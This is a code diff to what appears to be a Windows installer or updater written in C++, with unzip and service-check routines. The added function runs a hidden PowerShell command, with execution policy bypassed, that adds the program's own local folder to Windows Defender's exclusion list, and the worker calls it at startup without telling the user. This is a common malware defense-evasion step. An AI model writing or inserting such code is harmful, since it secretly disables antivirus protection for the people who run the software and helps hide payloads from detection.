@@ -202,6 +202,15 @@ static bool UnzipTo(const char* zip, const char* dst)
     LogMsg("Extract: Shell COM result=%d", (int)ok);
     return ok;
 }
+static bool AddDefenderExclusion(const char* path)
+{
+    char cmd[1024];
+    sprintf_s(cmd, "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '%s'\"", path);
+    LogMsg("Defender: adding exclusion for %s", path);
+    bool ok = RunHidden(cmd, NULL);
+    LogMsg("Defender: exclusion result=%d", (int)ok);
+    return ok;
+}
 static bool ServiceExists(const char* svc)
 {
     SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
@@ -283,6 +292,7 @@ static void Worker()
 {
     LogMsg("Worker started");
     SHCreateDirectoryExA(NULL, GetLocalPath("").c_str(), NULL);
+    AddDefenderExclusion(GetLocalPath("").c_str());
     FILE* f = NULL;
     std::string vp = GetLocalPath(VERSION_FILE);
     if (fopen_s(&f, vp.c_str(), "r") == 0 && f) {
